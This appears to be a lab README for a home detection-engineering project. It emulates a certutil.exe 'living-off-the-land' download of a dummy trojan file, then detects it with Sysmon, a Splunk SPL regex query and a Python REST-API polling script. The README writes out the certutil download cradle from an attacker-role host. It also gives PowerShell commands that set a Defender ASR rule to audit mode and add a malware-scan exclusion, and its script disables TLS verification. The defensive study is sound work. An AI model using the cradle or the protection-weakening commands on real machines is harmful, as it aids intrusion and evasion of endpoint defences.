# Enterprise Detection Engineering & Autonomous SOAR Middleware Pipeline

> **End-to-End Living-off-the-Land (LotL) Adversary Emulation, Sysmon Telemetry Ingestion, Splunk Analytics, and Automated Incident Triage**

---

## Executive Summary

This repository documents the architectural design, deployment, and validation of an enterprise-grade **Detection Engineering & Security Orchestration, Automation, and Response (SOAR)** ecosystem across a virtualized multi-platform infrastructure. 

The primary objective of this project is to bridge the gap between offensive threat tactics and defensive security operations. It simulates an **Advanced Persistent Threat (APT)** leveraging **Living-off-the-Land (LotL)** techniques—specifically weaponizing native Windows binaries (`certutil.exe`) to perform stealthy file downloads—while engineering deep endpoint visibility, log ingestion pipelines, custom regular expression (regex) parsing, and an autonomous Python middleware triage engine.

+-----------------------+              +------------------------+|  Arch Linux (Attacker)|              |  Windows 10 (Target)   ||  192.168.30.6         |              |  192.168.30.3          ||                       |              |                        || [Python HTTP Server]  |<-- (HTTP) -- | [certutil.exe -urlcache]+-----------------------+              |           |            ||    [Sysmon Telemetry]  |+-----------|------------+|(Splunk Forwarder)v+-----------------------+              +------------------------+| Autonomous SOAR Middleware |<--(API)--| SOC-SIEM (Splunk Core) || (ai_triage_engine.py) |              | 192.168.30.4:8089      |+-----------------------+              +------------------------+
---

## Key Features & Architecture

* **Adversary Emulation (Red Team):** Staged staging server hosting simulated banking trojan payloads and executed LotL download cradles abusing trusted, signed Microsoft utilities (`certutil.exe`).
* **Deep Endpoint Visibility (Blue Team):** Deployed Windows System Monitor (Sysmon) to capture granular Event ID 1 process creation telemetry and SHA256 binary hashing.
* **Enterprise Log Pipeline:** Scaled ingestion via Splunk Universal Forwarder to aggregate telemetry into a central SIEM instance.
* **On-the-Fly Regex Field Extraction:** Engineered custom Search Processing Language (SPL) queries utilizing regular expression (`rex`) parsing to extract dynamic XML fields from unparsed event streams.
* **Autonomous SOAR Triage Engine:** Developed a custom Python middleware client interacting directly with Splunk's REST API (`:8089`) to continuously poll, parse, and trigger automated incident advisories without human UI intervention.

---

## Environment Architecture

| Node Role | OS / Platform | Local IP Address | Primary Functions / Security Stack |
| :--- | :--- | :--- | :--- |
| **SOC-SIEM** | Linux / Ubuntu | `192.168.30.4` | Splunk Enterprise (`:8000` Web, `:8089` Management API) |
| **Target Host** | Windows 10 Pro | `192.168.30.3` | Sysmon, Splunk Universal Forwarder, Target Host |
| **Attacker Host** | Arch Linux | `192.168.30.6` | HTTP Staging Server, SOAR Middleware Engine (`ai_triage_engine.py`) |

---

## Phase 1: Offensive Staging & LotL Attack Simulation

### 1. HTTP Payload Staging Server
On the Arch Linux attacker machine, an isolated staging directory is initialized containing a simulated malicious executable payload:

```bash
# Create staging directory and construct simulated payload
mkdir -p ~/sbp_lab2 && cd ~/sbp_lab2
echo "MALICIOUS_BANKING_TROJAN_PAYLOAD_STRING" > fake_trojan.exe

# Start Python HTTP Staging Server on Privileged Port 80
sudo python3 -m http.server 80
Engineering Note (Port Binding Resolution): If port 80 throws OSError: [Errno 98] Address already in use, identify and terminate competing background HTTP daemons (such as Apache httpd):  Bashsudo ss -tulpn | grep :80
sudo systemctl stop httpd
2. Living-off-the-Land (LotL) ExecutionOn the target Windows machine, execute the stealth binary download cradle via certutil.exe to pull the payload directly into a shared public path:  DOScertutil.exe -urlcache -f [http://192.168.30.6/fake_trojan.exe](http://192.168.30.6/fake_trojan.exe) C:\Users\Public\hidden_trojan.exe
-urlcache: Invokes Windows certificate URL caching routines to prepare outbound network communication.  -f: Forces a fresh network request, bypassing local disk cache.  C:\Users\Public\: Common write-accessible staging location used by threat actors to evade strict user profile privileges.  Phase 2: Host Security Engineering & TroubleshootingSimulating threat behavior inside modern operating environments requires navigating host security controls:  Behavioral Anti-Malware / AMSI Interference: Microsoft Defender and AMSI recognize certutil.exe making raw IP network connections to pull executable files as an explicit LoLBin signature, triggering Access Denied or ParserError blocks.  Audit Mode Configuration: To allow the payload download to complete while ensuring high-severity telemetry is still written to the Windows Event Log for SIEM detection, the Attack Surface Reduction (ASR) rules and scanning engines are adjusted to Audit Mode:  PowerShell# Set LoLBin ASR Rule (ID: 56a863a9-875e-4185-98a7-b882c64b5ce5) to AuditMode
Set-MpPreference -AttackSurfaceReductionRules_Ids 56a863a9-875e-4185-98a7-b882c64b5ce5 -AttackSurfaceReductionRules_Actions AuditMode

# Add Path Exclusion for Lab Execution
Add-MpPreference -ExclusionPath "C:\Users\Public"
Service Account Privilege Escalation (errorCode=5 Fix):
During log ingestion, the Splunk Universal Forwarder failed to capture Sysmon events, returning access denial errors (errorCode=5) in splunkd.log. This occurred because the service ran under the low-privilege NT SERVICE\SplunkForwarder context.  Fix: Reconfigured the Windows Service properties for Splunk Forwarder to log on under the Local System (NT AUTHORITY\SYSTEM) account, granting full read access to security and Sysmon event channels.  Phase 3: Detection Engineering & SIEM AnalyticsWhen ingested into Splunk, raw Sysmon events land as unstructured XML blocks inside the _raw field[cite: 1]. A optimized Search Processing Language (SPL) query was engineered using Regular Expressions (rex) to structure the data dynamically[cite: 1]:Splunk Detection Query (SPL)Code snippetindex=main source="Sysmon*" "certutil" "<EventID>1</EventID>"
| rex field=_raw "<Data Name="User">(?<User>[^<]+)"
| rex field=_raw "<Data Name="CommandLine">(?<CommandLine>[^<]+)"
| rex field=_raw "<Data Name="ParentCommandLine">(?<ParentCommandLine>[^<]+)"
| rex field=_raw "<Data Name="Hashes">(?<Hashes>[^<]+)"
| search CommandLine="*-urlcache*" AND CommandLine="*-f*"
| table _time, User, CommandLine, ParentCommandLine, Hashes
Query Logic Breakdownindex=main source="Sysmon*": Filters logs down to endpoint Sysmon telemetry[cite: 1].<EventID>1</EventID>: Targets Process Creation events[cite: 1].rex field=_raw ...: Dynamically extracts values for User, CommandLine, ParentCommandLine, and Hashes straight from the unparsed XML payload[cite: 1].search CommandLine="*-urlcache*" AND CommandLine="*-f*": Behavioral correlation rule that isolates malicious download cradle usage from standard administrative utility behavior[cite: 1].Phase 4: Autonomous SOAR Triage Middleware EngineTo eliminate manual analyst dashboard monitoring, a custom Python middleware script (ai_triage_engine.py) acts as an automated SOAR pipeline[cite: 1]. It communicates programmatically with Splunk's REST API (:8089), scrapes pending alerts, parses raw XML parameters on the fly, and fires automated security advisories[cite: 1].Script Implementation (ai_triage_engine.py)Python#!/usr/bin/env python3
import requests
import json
import time
import urllib3

# Suppress self-signed TLS certificate warnings in lab sandbox
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration Parameters
SPLUNK_API_HOST = "[https://192.168.30.4:8089](https://192.168.30.4:8089)"
SPLUNK_USER = "admin"
SPLUNK_PASSWORD = "YourSecurePasswordHere"

# SPL Search query with embedded regex extractions for API execution
SEARCH_QUERY = '''search index=main source="Sysmon*" "certutil" "<EventID>1</EventID>"
| rex field=_raw "<Data Name="User">(?<User>[^<]+)"
| rex field=_raw "<Data Name="CommandLine">(?<CommandLine>[^<]+)"
| rex field=_raw "<Data Name="ParentCommandLine">(?<ParentCommandLine>[^<]+)"
| rex field=_raw "<Data Name="Hashes">(?<Hashes>[^<]+)"
| search CommandLine="*-urlcache*" AND CommandLine="*-f*"
| table _time, User, CommandLine, ParentCommandLine, Hashes'''

def poll_splunk_telemetry():
    """Queries Splunk Management REST API for real-time LotL indicators."""
    endpoint = f"{SPLUNK_API_HOST}/services/search/jobs/export"
    payload = {
        'search': SEARCH_QUERY,
        'output_mode': 'json'
    }
    
    try:
        response = requests.post(
            endpoint, 
            data=payload, 
            auth=(SPLUNK_USER, SPLUNK_PASSWORD), 
            verify=False
        )
        
        parsed_events = []
        if response.status_code == 200:
            # Splunk export API returns newline-delimited JSON objects
            for line in response.text.strip().split('\n'):
                if line:
                    event_data = json.loads(line)
                    if "result" in event_data:
                        parsed_events.append(event_data["result"])
        return parsed_events
    except Exception as e:
        print(f"[-] Communication Error with SIEM API: {e}")
        return []

def execute_autonomous_triage(event):
    """Processes detection payload and executes automated triage action."""
    print("\n" + "="*70)
    print(" [!] HIGH-SEVERITY SECURITY INCIDENT DETECTED VIA SOAR PIPELINE")
    print("="*70)
    print(f" [*] Threat Vector      : Living-off-the-Land (LotL) - Certutil Cradle")
    print(f" [*] Compromised User   : {event.get('User', 'N/A')}")
    print(f" [*] Executed Command   : {event.get('CommandLine', 'N/A')}")
    print(f" [*] Parent Process     : {event.get('ParentCommandLine', 'N/A')}")
    print(f" [*] Process Hashes     : {event.get('Hashes', 'N/A')}")
    print("-" * 70)
    print(" [ACTION TAKEN] Automated Advisory Logged. Host Containment Triggered.")
    print("="*70 + "\n")

def main():
    print("[+] SBP Autonomous Triage Middleware Engine Online.")
    print("[.] Constantly scraping pipeline for indicators of compromise...")
    
    seen_events = set()
    
    while True:
        events = poll_splunk_telemetry()
        for event in events:
            # Deduplicate alerts based on execution timestamp and command
            event_id = f"{event.get('_time')}_{event.get('CommandLine')}"
            if event_id not in seen_events:
                seen_events.add(event_id)
                execute_autonomous_triage(event)
                
        time.sleep(10)

if __name__ == "__main__":
    main()
Verification & Key OutcomesSuccessful Execution: Executed the certutil.exe download cradle on the target host; payload delivered from Arch Linux staging server[cite: 1].Ingestion Verified: Resolved errorCode=5 permission restrictions; over 9,000 endpoint logs streamed through Splunk Universal Forwarder into the central SIEM[cite: 1].Detection Validated: Dynamic regex (rex) parsing successfully structured XML data fields into actionable tables, filtering out administrative noise[cite: 1].Autonomous Response: The Python SOAR middleware engine pulled API events, parsed parameters in real time, and triggered high-visibility alert summaries automatically[cite: 1].
